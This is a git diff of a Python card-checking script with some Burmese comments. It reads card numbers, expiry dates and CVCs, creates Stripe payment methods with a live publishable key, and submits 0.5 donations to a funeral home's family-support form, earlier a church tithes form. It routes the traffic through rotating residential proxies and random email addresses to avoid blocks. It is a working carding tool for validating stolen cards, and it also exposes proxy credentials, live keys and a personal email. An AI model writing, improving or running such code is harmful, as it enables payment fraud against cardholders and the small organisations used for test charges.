@@ -1,81 +1,138 @@
 import requests, re
 import random
+import string
+from requests.adapters import HTTPAdapter
+from urllib3.util.retry import Retry
+
+# ==========================================
+# 👇 PROXY SETTINGS (US Virginia Beach 🇺🇸 + Auto Retry)
+# ==========================================
+
+PROXY_HOST = 'geo.g-w.info'
+PROXY_PORT = '10080'
+
+# 🔥 မင်းရဲ့ Proxy User/Pass
+PROXY_USER = 'user-7xkEOw8bXcNNWHHW-type-residential-session-vdreepzz-country-US-city-Virginia_Beach-rotation-15'
+PROXY_PASS = 'CMvQFPYozpgFTlXC'
+
+# Proxy String
+proxy_url = f"http://{PROXY_USER}:{PROXY_PASS}@{PROXY_HOST}:{PROXY_PORT}"
+proxies = {
+    'http': proxy_url,
+    'https': proxy_url
+}
 
 def Tele(ccx):
-    ccx = ccx.strip()
-    n = ccx.split("|")[0]
-    mm = ccx.split("|")[1]
-    yy = ccx.split("|")[2]
-    cvc = ccx.split("|")[3]
+    try:
+        ccx = ccx.strip()
+        n = ccx.split("|")[0]
+        mm = ccx.split("|")[1]
+        yy = ccx.split("|")[2]
+        cvc = ccx.split("|")[3]
 
-    if "20" in yy:  # Mo3gza
-        yy = yy.split("20")[1]
+        if "20" in yy:
+            yy = yy.split("20")[1]
 
-    r = requests.session()
+        letters = string.ascii_lowercase + string.digits
+        random_name = ''.join(random.choice(letters) for i in range(10))
+        random_email = f"{random_name}@gmail.com"
 
-    random_amount1 = random.randint(1, 4)
-    random_amount2 = random.randint(1, 99)
+        # 🔥 RETRY SYSTEM
+        session = requests.Session()
+        retry = Retry(connect=3, backoff_factor=0.5)
+        adapter = HTTPAdapter(max_retries=retry)
+        session.mount('http://', adapter)
+        session.mount('https://', adapter)
+        session.proxies = proxies
 
-    headers = {
-        'authority': 'api.stripe.com',
-        'accept': 'application/json',
-        'accept-language': 'en-US,en;q=0.9',
-        'content-type': 'application/x-www-form-urlencoded',
-        'origin': 'https://js.stripe.com',
-        'referer': 'https://js.stripe.com/',
-        'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
-        'sec-ch-ua-mobile': '?1',
-        'sec-ch-ua-platform': '"Android"',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'same-site',
-        'user-agent': 'Mozilla/5.0 (Linux; Android 16; 2410DPN6CC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
-    }
+        # ==========================================
+        # Step 1: Create Payment Method (Stripe)
+        # ==========================================
+        headers = {
+            'authority': 'api.stripe.com',
+            'accept': 'application/json',
+            'accept-language': 'en-US,en;q=0.9',
+            'content-type': 'application/x-www-form-urlencoded',
+            'origin': 'https://js.stripe.com',
+            'referer': 'https://js.stripe.com/',
+            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'empty',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-site': 'same-site',
+            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
+        }
+        
+        data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2Fc264a67020%3B+stripe-js-v3%2Fc264a67020%3B+card-element&key=pk_live_51JNN5kCPT27SWWccxqzoGW8uBAVSg8XaS1aFtpbAD8nRcPLmqOyajKoGVA3Pfh9mgZ7EBGaro0mS9BrLxwO2yCmH00ssRNida2'
+        
+        # Proxy အလုပ်လုပ်အောင် session.post သုံးရမယ်
+        response = session.post(
+            'https://api.stripe.com/v1/payment_methods',
+            headers=headers,
+            data=data,
+            timeout=40 
+        )
 
-    data = f'type=card&billing_details[name]=Min+Thant&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=955aa4a4-149f-4375-946f-dff40d9f59cb536d5b&muid=b7054ee1-028f-47dc-b7a5-00acaea7e0f2767ea5&sid=11015094-7c28-40d9-9209-34221a0e860829522c&payment_user_agent=stripe.js%2F328730e3ee%3B+stripe-js-v3%2F328730e3ee%3B+card-element&referrer=https%3A%2F%2Frivernetworkchurch.org.uk&time_on_page=28921&client_attribution_metadata[client_session_id]=aafc5276-da48-4b35-967f-e05e9a2cd2c4&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_51Op8d8GLdQ7N2bVjuMWV6qteyKXoHklyfJXorljrH32nZ9vLEJyvfN77EY4Clpdlkd1AN7xjrd17nJWolSI4bpNA004zu0cPZh'
+        if 'id' not in response.json():
+            return "Proxy Error (PM Failed) ❌"
+            
+        pm = response.json()['id']
 
-    response = requests.post(
-        'https://api.stripe.com/v1/payment_methods',
-        headers=headers,
-        data=data
-    )
+        # ==========================================
+        # Step 2: Charge Request (Brendan Ennis Funerals)
+        # ==========================================
+        headers = {
+            'Accept': 'application/json, text/javascript, */*; q=0.01',
+            'Accept-Language': 'en-US,en;q=0.9',
+            'Connection': 'keep-alive',
+            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+            'Origin': 'https://brendanennisfunerals.ie',
+            'Referer': 'https://brendanennisfunerals.ie/help-a-family-with-costs/',
+            'Sec-Fetch-Dest': 'empty',
+            'Sec-Fetch-Mode': 'cors',
+            'Sec-Fetch-Site': 'same-origin',
+            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
+            'X-Requested-With': 'XMLHttpRequest',
+            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+        }
 
-    pm = response.json()['id']
+        data = {
+            'action': 'wp_full_stripe_inline_donation_charge',
+            'wpfs-form-name': 'help-a-family-with-cost',
+            'wpfs-form-get-parameters': '%7B%7D',
+            'wpfs-custom-amount': 'other',
+            'wpfs-custom-amount-unique': '0.5',
+            'wpfs-donation-frequency': 'one-time',
+            'wpfs-custom-input[]': [
+                'Min Thant',
+                'US',
+                '13125550124',
+            ],
+            'wpfs-card-holder-email': random_email,
+            'wpfs-card-holder-name': 'Min Thant',
+            'wpfs-stripe-payment-method-id': f'{pm}',
+        }
 
-    headers = {
-        'authority': 'rivernetworkchurch.org.uk',
-        'accept': 'application/json, text/javascript, */*; q=0.01',
-        'accept-language': 'en-US,en;q=0.9',
-        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-        'origin': 'https://rivernetworkchurch.org.uk',
-        'referer': 'https://rivernetworkchurch.org.uk/tithes-offerings/',
-        'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
-        'sec-ch-ua-mobile': '?1',
-        'sec-ch-ua-platform': '"Android"',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'same-origin',
-        'user-agent': 'Mozilla/5.0 (Linux; Android 16; 2410DPN6CC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
-        'x-requested-with': 'XMLHttpRequest',
-    }
+        response = session.post(
+            'https://brendanennisfunerals.ie/wp-admin/admin-ajax.php',
+            headers=headers,
+            data=data,
+            timeout=40
+        )
+        
+        try:
+            result = response.json()['message']
+        except:
+            if "Cloudflare" in response.text or response.status_code == 403:
+                result = "IP Blocked by Site ❌"
+            else:
+                result = "Decline⛔"
 
-    data = {
-        'action': 'wp_full_stripe_inline_donation_charge',
-        'wpfs-form-name': 'RiverNetworkChurchDonation',
-        'wpfs-form-get-parameters': '%7B%7D',
-        'wpfs-custom-amount': 'other',
-        'wpfs-custom-amount-unique': '1',
-        'wpfs-donation-frequency': 'one-time',
-        'wpfs-card-holder-email': 'minthantshin.virus11@gmail.com',
-        'wpfs-card-holder-name': 'Min Thant',
-        'wpfs-stripe-payment-method-id': f'{pm}',
-    }
-
-    response = requests.post(
-        'https://rivernetworkchurch.org.uk/wp-admin/admin-ajax.php',
-        headers=headers,
-        data=data
-    )
-
-    result = response.json()['message']
+    except Exception as e:
+        # ၃ ခါလုံး Retry လုပ်လို့မှ မရရင်တော့ တကယ် Error ပါ
+        result = f"Connection Failed (Retry Limit) ⚠️"
+        
     return result
